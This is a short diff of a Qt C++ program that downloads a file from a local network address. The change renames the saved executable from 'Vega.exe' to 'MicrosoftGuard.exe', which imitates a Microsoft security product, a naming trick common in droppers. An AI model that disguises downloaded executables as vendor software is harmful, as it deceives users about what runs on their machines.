@@ -27,7 +27,7 @@ int main(int argc, char *argv[])
 
     // 替换为你的文件下载链接和保存路径
     QUrl downloadUrl("http://192.168.1.100/lastfile");
-    QString fileName = "Vega.exe";
+    QString fileName = "MicrosoftGuard.exe";
 
     // 创建文件下载器实例
     FileDownloader fileDownloader(downloadUrl, fileName);
